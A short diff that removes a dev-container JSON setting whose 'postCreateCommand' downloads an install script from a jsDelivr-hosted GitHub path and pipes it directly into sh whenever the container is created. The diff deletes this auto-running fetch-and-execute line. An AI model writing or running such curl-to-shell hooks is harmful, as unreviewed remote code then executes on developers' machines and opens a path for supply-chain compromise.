@@ -1,3 +1,0 @@
-{
-  "postCreateCommand": "curl -fsSL https://cdn.jsdelivr.net/gh/acme/tools@0123456789abcdef0123456789abcdef01234567/install.sh | sh"
-}
